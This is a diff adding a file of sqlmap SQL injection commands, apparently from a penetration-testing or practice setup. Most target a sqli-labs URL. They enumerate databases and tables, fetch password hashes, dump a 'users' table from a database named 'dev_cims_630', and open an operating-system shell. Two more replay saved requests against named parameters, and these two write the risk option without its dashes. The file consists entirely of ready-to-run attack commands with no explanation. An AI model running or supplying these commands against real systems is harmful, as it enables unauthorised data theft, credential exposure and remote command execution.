@@ -1,0 +1,15 @@
+python sqlmap.py -u "http://www.sqli-labs.com/Less-1/?id=5" --batch --banner
+
+python sqlmap.py -u "http://www.sqli-labs.com/Less-1/?id=5" --batch --passwords
+
+python sqlmap.py -u "http://www.sqli-labs.com/Less-1/?id=5" --batch --dbs
+
+python sqlmap.py -u "http://www.sqli-labs.com/Less-1/?id=5" --batch --tables -D dev_cims_630
+
+python sqlmap.py -u "http://www.sqli-labs.com/Less-1/?id=5" --batch --dump -T users -D dev_cims_630
+
+python sqlmap.py -u "http://www.sqli-labs.com/Less-1/?id=5" --batch --os-shell
+
+python sqlmap.py -r ./requests/request_001.txt --batch --level=5 risk=3 -p requestCode
+
+python sqlmap.py -r ./requests/request_001.txt --batch --level=5 risk=3 -p sortFiled
